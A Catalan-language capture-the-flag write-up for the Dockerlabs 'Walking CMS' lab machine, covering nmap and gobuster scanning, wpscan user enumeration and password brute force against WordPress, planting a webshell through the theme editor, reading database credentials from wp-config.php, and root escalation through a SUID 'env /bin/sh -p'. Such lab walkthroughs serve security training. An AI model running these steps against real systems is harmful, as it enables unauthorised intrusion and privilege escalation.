# Walking CMS

Plataforma: Dockerlabs OS: Linux Level: Easy Status: Done Complete: Yes EJPT: yes Created time: 5 de diciembre de 2024 21:36

### NMAP

```bash
sudo nmap -p- -sS -vvv  -n -Pn 172.17.0.2 -oG allports
```

![image.png](../../.gitbook/assets/image.png)

![image.png](<../../.gitbook/assets/image 1.png>)

Gobuster per trobar directoris :

```bash
gobuster dir -u [http://172.17.0.2](http://172.17.0.2/) -w /usr/share/wordlists/dirb/common.txt
```

![image.png](<../../.gitbook/assets/image 2.png>)

Es un wordpress. Enumerem usuaris :

```bash
sudo wpscan --url [http://172.17.0.2/wordpress](http://172.17.0.2/wordpress) --enumerate u
```

![image.png](<../../.gitbook/assets/image 3.png>)

Usuari : mario

Busquem password amb :

```bash
sudo wpscan --url [http://172.17.0.2/wordpress](http://172.17.0.2/wordpress) -P /usr/share/wordlists/rockyou.txt
```

![image.png](<../../.gitbook/assets/image 4.png>)

Password: love

mario/love

Entrem al wp-admin amb les credencials entrem al editor de themes i creem un nou com a test.php amb la webshell:

![image.png](<../../.gitbook/assets/image 5.png>)

Ens posen a l'espera i executem la webshell:

![image.png](<../../.gitbook/assets/image 6.png>)

Mire fitxer wp-config.php

Database: username: wordpressuser Data base password: t9sH76gpQ82UFeZ3GXZS

Tractament TTY:

```bash
script /dev/null -c bash
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

Busquem permisos:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Explotem env:

```java
env /bin/sh -p

```

![image.png](<../../.gitbook/assets/image 7.png>)
